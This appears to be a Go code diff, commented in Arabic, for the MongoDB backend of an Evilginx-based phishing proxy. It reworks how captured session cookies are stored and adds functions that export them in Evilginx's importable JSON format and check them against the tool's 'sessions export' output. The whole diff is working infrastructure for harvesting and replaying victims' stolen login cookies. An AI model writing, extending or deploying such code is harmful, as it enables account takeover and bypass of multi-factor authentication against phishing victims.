@@ -11,6 +11,7 @@ import (
 	"go.mongodb.org/mongo-driver/bson/primitive"
 	"go.mongodb.org/mongo-driver/mongo"
 	"go.mongodb.org/mongo-driver/mongo/options"
+	"encoding/json"
 )
 
 // MongoDatabase هو نسخة من قاعدة البيانات تستخدم MongoDB
@@ -123,6 +124,19 @@ func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
 	return mongoDB, nil
 }
 
+// NewMongoDatabaseFromExisting creates a MongoDatabase instance from existing MongoDB connection details
+func NewMongoDatabaseFromExisting(client *mongo.Client, dbName string) *MongoDatabase {
+	db := client.Database(dbName)
+	sessionsColl := db.Collection("sessions")
+	
+	return &MongoDatabase{
+		client:       client,
+		db:           db,
+		sessionsColl: sessionsColl,
+		ctx:          context.Background(),
+	}
+}
+
 // Close يغلق اتصال قاعدة البيانات
 func (m *MongoDatabase) Close() error {
 	defer m.cancel()
@@ -146,21 +160,41 @@ func stringToObjectID(idStr string) primitive.ObjectID {
 // convertToMongoSession يحول كائن Session التقليدي إلى كائن MongoSession
 func convertToMongoSession(s *Session) *MongoSession {
 
-	// تحويل CookieTokens
+	// تحويل CookieTokens - مطابق لتنسيق Evilginx
 	cookieTokens := make(map[string][]map[string]interface{})
 	for domain, tokens := range s.CookieTokens {
 		cookieTokens[domain] = []map[string]interface{}{}
-		for _, token := range tokens {
-			hostOnly := !strings.HasPrefix(domain, ".")
+		for name, token := range tokens {
+			// تطبيق نفس منطق Evilginx لتحديد Secure
+			secure := false
+			if strings.Index(name, "__Host-") == 0 || strings.Index(name, "__Secure-") == 0 {
+				secure = true
+			}
+			
+			// تطبيق نفس منطق Evilginx لتحديد HostOnly
+			hostOnly := true
+			if strings.HasPrefix(domain, ".") {
+				hostOnly = false
+			}
+			
+			// تطبيق نفس منطق Evilginx للـ Path
+			path := token.Path
+			if path == "" {
+				path = "/"
+			}
+			
+			// تطبيق نفس منطق Evilginx للـ ExpirationDate (1 سنة)
+			expirationDate := time.Now().Add(365 * 24 * time.Hour).Unix()
+			
 			cookieObj := map[string]interface{}{
-				"name":   token.Name,
-				"value":  token.Value,
-				"domain": domain,
-				"path":   token.Path,
-				"expirationDate": token.ExpirationDate,
+				"name":           name,
+				"value":          token.Value,
+				"domain":         domain,
+				"path":           path,
+				"expirationDate": expirationDate,
 				"httpOnly":       token.HttpOnly,
 				"hostOnly":       hostOnly,
-				"secure":         false,
+				"secure":         secure,
 				"session":        false,
 			}
 			cookieTokens[domain] = append(cookieTokens[domain], cookieObj)
@@ -597,19 +631,40 @@ func (m *MongoDatabase) UpdateSessionCustom(sid, name, value string) error {
 func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
 	//log.Debug("[MongoDB] محاولة تحديث الكوكيز للجلسة: %s", sid)
 
-	// تحويل الكوكيز من Session (in-memory) إلى تنسيق MongoDB
+	// تحويل الكوكيز من Session (in-memory) إلى تنسيق MongoDB - مطابق لتنسيق Evilginx
 	cookieTokens := make(map[string][]map[string]interface{})
 	for domain, domainTokens := range tokens {
-		for _, token := range domainTokens {
+		for name, token := range domainTokens {
+			// تطبيق نفس منطق Evilginx لتحديد Secure
+			secure := false
+			if strings.Index(name, "__Host-") == 0 || strings.Index(name, "__Secure-") == 0 {
+				secure = true
+			}
+			
+			// تطبيق نفس منطق Evilginx لتحديد HostOnly
+			hostOnly := true
+			if strings.HasPrefix(domain, ".") {
+				hostOnly = false
+			}
+			
+			// تطبيق نفس منطق Evilginx للـ Path
+			path := token.Path
+			if path == "" {
+				path = "/"
+			}
+			
+			// تطبيق نفس منطق Evilginx للـ ExpirationDate (1 سنة)
+			expirationDate := time.Now().Add(365 * 24 * time.Hour).Unix()
+			
 			cookieObj := map[string]interface{}{
-				"name":   token.Name,
-				"value":  token.Value,
-				"domain": domain,
-				"path":   token.Path,
-				"expirationDate": token.ExpirationDate,
+				"name":           name,
+				"value":          token.Value,
+				"domain":         domain,
+				"path":           path,
+				"expirationDate": expirationDate,
 				"httpOnly":       token.HttpOnly,
-				"hostOnly":       !strings.HasPrefix(domain, "."),
-				"secure":         false,
+				"hostOnly":       hostOnly,
+				"secure":         secure,
 				"session":        false,
 			}
 			cookieTokens[domain] = append(cookieTokens[domain], cookieObj)
@@ -904,4 +959,408 @@ func (m *MongoDatabase) MigrateAllSessionsToObjectID() error {
 // MigrateToObjectIDs تحويل جميع البيانات السابقة من string إلى ObjectID - متاحة للاستخدام من الخارج
 func (m *MongoDatabase) MigrateToObjectIDs() error {
 	return m.MigrateAllSessionsToObjectID()
+} 
+
+// ExportCookiesAsEvilginxFormat exports cookies from MongoDB in the exact same format as Evilginx's terminal command
+func (m *MongoDatabase) ExportCookiesAsEvilginxFormat(sid string) (string, error) {
+	// Get session from MongoDB
+	var mongoSession MongoSession
+	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&mongoSession)
+	if err != nil {
+		return "", fmt.Errorf("session not found: %s", sid)
+	}
+
+	// Convert to Evilginx format
+	type Cookie struct {
+		Path           string `json:"path"`
+		Domain         string `json:"domain"`
+		ExpirationDate int64  `json:"expirationDate"`
+		Value          string `json:"value"`
+		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly"`
+		HostOnly       bool   `json:"hostOnly"`
+		Secure         bool   `json:"secure"`
+		Session        bool   `json:"session"`
+	}
+
+	var cookies []*Cookie
+	for domain, tokens := range mongoSession.CookieTokens {
+		for _, token := range tokens {
+			name := getStringValue(token["name"])
+			value := getStringValue(token["value"])
+			path := getStringValue(token["path"])
+			httpOnly := getBoolValue(token["httpOnly"])
+			hostOnly := getBoolValue(token["hostOnly"])
+			secure := getBoolValue(token["secure"])
+			
+			// Get expiration date
+			expirationDate := int64(0)
+			if ed, ok := token["expirationDate"]; ok {
+				switch v := ed.(type) {
+				case int64:
+					expirationDate = v
+				case int32:
+					expirationDate = int64(v)
+				case float64:
+					expirationDate = int64(v)
+				case float32:
+					expirationDate = int64(v)
+				case string:
+					if parsed, err := strconv.ParseInt(v, 10, 64); err == nil {
+						expirationDate = parsed
+					}
+				}
+			}
+
+			c := &Cookie{
+				Path:           path,
+				Domain:         domain,
+				ExpirationDate: expirationDate,
+				Value:          value,
+				Name:           name,
+				HttpOnly:       httpOnly,
+				HostOnly:       hostOnly,
+				Secure:         secure,
+				Session:        false,
+			}
+			cookies = append(cookies, c)
+		}
+	}
+
+	json, err := json.Marshal(cookies)
+	if err != nil {
+		return "", fmt.Errorf("failed to marshal cookies: %v", err)
+	}
+	
+	return string(json), nil
+} 
+
+// CompareCookiesWithEvilginxFormat compares cookies from MongoDB with Evilginx's format and logs differences
+func (m *MongoDatabase) CompareCookiesWithEvilginxFormat(sid string) error {
+	// Get MongoDB cookies
+	mongoCookies, err := m.ExportCookiesAsEvilginxFormat(sid)
+	if err != nil {
+		return fmt.Errorf("failed to get MongoDB cookies: %v", err)
+	}
+
+	// Get session from database
+	session, err := m.GetSessionBySid(sid)
+	if err != nil {
+		return fmt.Errorf("failed to get session: %v", err)
+	}
+
+	// Convert session cookies to Evilginx format for comparison
+	type Cookie struct {
+		Path           string `json:"path"`
+		Domain         string `json:"domain"`
+		ExpirationDate int64  `json:"expirationDate"`
+		Value          string `json:"value"`
+		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly"`
+		HostOnly       bool   `json:"hostOnly"`
+		Secure         bool   `json:"secure"`
+		Session        bool   `json:"session"`
+	}
+
+	var evilginxCookies []*Cookie
+	for domain, tokens := range session.CookieTokens {
+		for name, token := range tokens {
+			// Apply Evilginx logic
+			secure := false
+			if strings.Index(name, "__Host-") == 0 || strings.Index(name, "__Secure-") == 0 {
+				secure = true
+			}
+			
+			hostOnly := true
+			if strings.HasPrefix(domain, ".") {
+				hostOnly = false
+			}
+			
+			path := token.Path
+			if path == "" {
+				path = "/"
+			}
+			
+			expirationDate := time.Now().Add(365 * 24 * time.Hour).Unix()
+
+			c := &Cookie{
+				Path:           path,
+				Domain:         domain,
+				ExpirationDate: expirationDate,
+				Value:          token.Value,
+				Name:           name,
+				HttpOnly:       token.HttpOnly,
+				HostOnly:       hostOnly,
+				Secure:         secure,
+				Session:        false,
+			}
+			evilginxCookies = append(evilginxCookies, c)
+		}
+	}
+
+	evilginxJSON, err := json.Marshal(evilginxCookies)
+	if err != nil {
+		return fmt.Errorf("failed to marshal Evilginx cookies: %v", err)
+	}
+
+	// Compare the two formats
+	fmt.Printf("=== Cookie Comparison for Session %s ===\n", sid)
+	fmt.Printf("MongoDB Format:\n%s\n\n", mongoCookies)
+	fmt.Printf("Evilginx Format:\n%s\n\n", string(evilginxJSON))
+	
+	if mongoCookies == string(evilginxJSON) {
+		fmt.Printf("✅ Cookies match exactly!\n")
+	} else {
+		fmt.Printf("❌ Cookies do not match. Differences detected.\n")
+	}
+
+	return nil
+} 
+
+// CookieComparisonResult holds the result of comparing cookies
+type CookieComparisonResult struct {
+	MissingInMongoDB    []string                    `json:"missing_in_mongodb"`
+	MissingInEvilginx   []string                    `json:"missing_in_evilginx"`
+	MismatchedCookies   map[string]CookieMismatch   `json:"mismatched_cookies"`
+	MatchingCookies     []string                    `json:"matching_cookies"`
+	TotalEvilginx       int                         `json:"total_evilginx"`
+	TotalMongoDB        int                         `json:"total_mongodb"`
+	PerfectMatch        bool                        `json:"perfect_match"`
+}
+
+// CookieMismatch holds details about mismatched cookie attributes
+type CookieMismatch struct {
+	EvilginxValue string `json:"evilginx_value"`
+	MongoDBValue  string `json:"mongodb_value"`
+	Attribute     string `json:"attribute"`
+}
+
+// ValidateCookiesAgainstEvilginx compares cookies from MongoDB with Evilginx's sessions export format
+func (m *MongoDatabase) ValidateCookiesAgainstEvilginx(sid string, evilginxCookiesJSON string) (*CookieComparisonResult, error) {
+	result := &CookieComparisonResult{
+		MissingInMongoDB:  []string{},
+		MissingInEvilginx: []string{},
+		MismatchedCookies: make(map[string]CookieMismatch),
+		MatchingCookies:   []string{},
+	}
+
+	// Parse Evilginx cookies JSON
+	type EvilginxCookie struct {
+		Path           string `json:"path"`
+		Domain         string `json:"domain"`
+		ExpirationDate int64  `json:"expirationDate"`
+		Value          string `json:"value"`
+		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly"`
+		HostOnly       bool   `json:"hostOnly"`
+		Secure         bool   `json:"secure"`
+		Session        bool   `json:"session"`
+	}
+
+	var evilginxCookies []EvilginxCookie
+	err := json.Unmarshal([]byte(evilginxCookiesJSON), &evilginxCookies)
+	if err != nil {
+		return nil, fmt.Errorf("failed to parse Evilginx cookies JSON: %v", err)
+	}
+
+	// Get MongoDB cookies in Evilginx format
+	mongoCookiesJSON, err := m.ExportCookiesAsEvilginxFormat(sid)
+	if err != nil {
+		return nil, fmt.Errorf("failed to export MongoDB cookies: %v", err)
+	}
+
+	var mongoCookies []EvilginxCookie
+	err = json.Unmarshal([]byte(mongoCookiesJSON), &mongoCookies)
+	if err != nil {
+		return nil, fmt.Errorf("failed to parse MongoDB cookies JSON: %v", err)
+	}
+
+	// Create maps for easy lookup
+	evilginxMap := make(map[string]EvilginxCookie)
+	mongoMap := make(map[string]EvilginxCookie)
+
+	// Index Evilginx cookies by domain+name
+	for _, cookie := range evilginxCookies {
+		key := fmt.Sprintf("%s:%s", cookie.Domain, cookie.Name)
+		evilginxMap[key] = cookie
+	}
+
+	// Index MongoDB cookies by domain+name
+	for _, cookie := range mongoCookies {
+		key := fmt.Sprintf("%s:%s", cookie.Domain, cookie.Name)
+		mongoMap[key] = cookie
+	}
+
+	result.TotalEvilginx = len(evilginxCookies)
+	result.TotalMongoDB = len(mongoCookies)
+
+	// Check for cookies missing in MongoDB
+	for key := range evilginxMap {
+		if _, exists := mongoMap[key]; !exists {
+			result.MissingInMongoDB = append(result.MissingInMongoDB, key)
+		}
+	}
+
+	// Check for cookies missing in Evilginx
+	for key := range mongoMap {
+		if _, exists := evilginxMap[key]; !exists {
+			result.MissingInEvilginx = append(result.MissingInEvilginx, key)
+		}
+	}
+
+	// Compare matching cookies for attribute differences
+	for key, evilginxCookie := range evilginxMap {
+		if mongoCookie, exists := mongoMap[key]; exists {
+			// Compare all attributes
+			if evilginxCookie.Value != mongoCookie.Value {
+				result.MismatchedCookies[key] = CookieMismatch{
+					EvilginxValue: evilginxCookie.Value,
+					MongoDBValue:  mongoCookie.Value,
+					Attribute:     "value",
+				}
+			} else if evilginxCookie.Domain != mongoCookie.Domain {
+				result.MismatchedCookies[key] = CookieMismatch{
+					EvilginxValue: evilginxCookie.Domain,
+					MongoDBValue:  mongoCookie.Domain,
+					Attribute:     "domain",
+				}
+			} else if evilginxCookie.Path != mongoCookie.Path {
+				result.MismatchedCookies[key] = CookieMismatch{
+					EvilginxValue: evilginxCookie.Path,
+					MongoDBValue:  mongoCookie.Path,
+					Attribute:     "path",
+				}
+			} else if evilginxCookie.Secure != mongoCookie.Secure {
+				result.MismatchedCookies[key] = CookieMismatch{
+					EvilginxValue: fmt.Sprintf("%t", evilginxCookie.Secure),
+					MongoDBValue:  fmt.Sprintf("%t", mongoCookie.Secure),
+					Attribute:     "secure",
+				}
+			} else if evilginxCookie.HttpOnly != mongoCookie.HttpOnly {
+				result.MismatchedCookies[key] = CookieMismatch{
+					EvilginxValue: fmt.Sprintf("%t", evilginxCookie.HttpOnly),
+					MongoDBValue:  fmt.Sprintf("%t", mongoCookie.HttpOnly),
+					Attribute:     "httpOnly",
+				}
+			} else if evilginxCookie.HostOnly != mongoCookie.HostOnly {
+				result.MismatchedCookies[key] = CookieMismatch{
+					EvilginxValue: fmt.Sprintf("%t", evilginxCookie.HostOnly),
+					MongoDBValue:  fmt.Sprintf("%t", mongoCookie.HostOnly),
+					Attribute:     "hostOnly",
+				}
+			} else if evilginxCookie.ExpirationDate != mongoCookie.ExpirationDate {
+				result.MismatchedCookies[key] = CookieMismatch{
+					EvilginxValue: fmt.Sprintf("%d", evilginxCookie.ExpirationDate),
+					MongoDBValue:  fmt.Sprintf("%d", mongoCookie.ExpirationDate),
+					Attribute:     "expirationDate",
+				}
+			} else {
+				// All attributes match
+				result.MatchingCookies = append(result.MatchingCookies, key)
+			}
+		}
+	}
+
+	// Determine if it's a perfect match
+	result.PerfectMatch = len(result.MissingInMongoDB) == 0 && 
+		len(result.MissingInEvilginx) == 0 && 
+		len(result.MismatchedCookies) == 0
+
+	return result, nil
+}
+
+// PrintCookieValidationReport prints a detailed report of cookie validation
+func (m *MongoDatabase) PrintCookieValidationReport(sid string, evilginxCookiesJSON string) error {
+	result, err := m.ValidateCookiesAgainstEvilginx(sid, evilginxCookiesJSON)
+	if err != nil {
+		return err
+	}
+
+	fmt.Printf("\n=== Cookie Validation Report for Session %s ===\n", sid)
+	fmt.Printf("📊 Summary:\n")
+	fmt.Printf("   • Total Evilginx cookies: %d\n", result.TotalEvilginx)
+	fmt.Printf("   • Total MongoDB cookies: %d\n", result.TotalMongoDB)
+	fmt.Printf("   • Perfect match: %t\n", result.PerfectMatch)
+
+	if result.PerfectMatch {
+		fmt.Printf("✅ All cookies match perfectly!\n")
+		return nil
+	}
+
+	// Report missing cookies
+	if len(result.MissingInMongoDB) > 0 {
+		fmt.Printf("\n❌ Missing in MongoDB (%d cookies):\n", len(result.MissingInMongoDB))
+		for _, key := range result.MissingInMongoDB {
+			fmt.Printf("   • %s\n", key)
+		}
+	}
+
+	if len(result.MissingInEvilginx) > 0 {
+		fmt.Printf("\n⚠️  Missing in Evilginx (%d cookies):\n", len(result.MissingInEvilginx))
+		for _, key := range result.MissingInEvilginx {
+			fmt.Printf("   • %s\n", key)
+		}
+	}
+
+	// Report mismatched cookies
+	if len(result.MismatchedCookies) > 0 {
+		fmt.Printf("\n🔍 Mismatched cookies (%d cookies):\n", len(result.MismatchedCookies))
+		for key, mismatch := range result.MismatchedCookies {
+			fmt.Printf("   • %s (%s):\n", key, mismatch.Attribute)
+			fmt.Printf("     Evilginx: %s\n", mismatch.EvilginxValue)
+			fmt.Printf("     MongoDB:  %s\n", mismatch.MongoDBValue)
+		}
+	}
+
+	// Report matching cookies
+	if len(result.MatchingCookies) > 0 {
+		fmt.Printf("\n✅ Matching cookies (%d cookies):\n", len(result.MatchingCookies))
+		for _, key := range result.MatchingCookies {
+			fmt.Printf("   • %s\n", key)
+		}
+	}
+
+	fmt.Printf("\n=== End Report ===\n")
+	return nil
+} 
+
+// ValidateSessionCookies is a helper function that takes Evilginx sessions export output and validates against MongoDB
+func (m *MongoDatabase) ValidateSessionCookies(sid string, evilginxExportOutput string) error {
+	// The evilginxExportOutput should be the JSON output from "sessions export <id>" command
+	// Clean up the output if it contains any extra text
+	evilginxExportOutput = strings.TrimSpace(evilginxExportOutput)
+	
+	// Try to extract JSON if the output contains extra text
+	if strings.Contains(evilginxExportOutput, "[") && strings.Contains(evilginxExportOutput, "]") {
+		start := strings.Index(evilginxExportOutput, "[")
+		end := strings.LastIndex(evilginxExportOutput, "]") + 1
+		if start >= 0 && end > start {
+			evilginxExportOutput = evilginxExportOutput[start:end]
+		}
+	}
+
+	// Print the validation report
+	return m.PrintCookieValidationReport(sid, evilginxExportOutput)
+}
+
+// GetCookieValidationSummary returns a quick summary of cookie validation without detailed printing
+func (m *MongoDatabase) GetCookieValidationSummary(sid string, evilginxCookiesJSON string) (string, error) {
+	result, err := m.ValidateCookiesAgainstEvilginx(sid, evilginxCookiesJSON)
+	if err != nil {
+		return "", err
+	}
+
+	var summary strings.Builder
+	summary.WriteString(fmt.Sprintf("Session %s: ", sid))
+	
+	if result.PerfectMatch {
+		summary.WriteString("✅ Perfect match")
+	} else {
+		summary.WriteString(fmt.Sprintf("❌ Issues found - Missing in MongoDB: %d, Missing in Evilginx: %d, Mismatched: %d", 
+			len(result.MissingInMongoDB), len(result.MissingInEvilginx), len(result.MismatchedCookies)))
+	}
+	
+	summary.WriteString(fmt.Sprintf(" (Evilginx: %d, MongoDB: %d)", result.TotalEvilginx, result.TotalMongoDB))
+	
+	return summary.String(), nil
 } 
